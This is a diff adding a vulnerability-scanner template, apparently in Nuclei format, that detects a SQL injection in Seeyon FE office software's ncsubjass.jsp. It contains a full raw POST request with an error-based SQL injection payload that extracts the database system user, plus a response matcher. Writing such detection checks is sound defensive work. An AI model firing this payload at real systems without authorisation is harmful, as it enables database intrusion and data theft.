@@ -1,0 +1,34 @@
+id: Seeyon_FE_OA_ncsubjass_SQL_injected
+
+info:
+  name: Seeyon_FE_OA_ncsubjass_SQL_injected
+  author: security-xm
+  severity: high
+  description: There is a SQL injection vulnerability in the ncsubjass.jsp of Zhiyuan Internet's FE collaborative office platform
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /fenc/ncsubjass.j%73p HTTP/1.1
+        Accept-Encoding: gzip, deflate, br
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=A29F8F31E3D9BA108017E2FF1BA07AFD
+        Connection: close
+        Content-Length: 498
+
+        subjcode=1%27%20AND%203576%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28SYSTEM_USER%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27jPMS%27%3D%27jPMS
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - qjzbqsaqjzvq
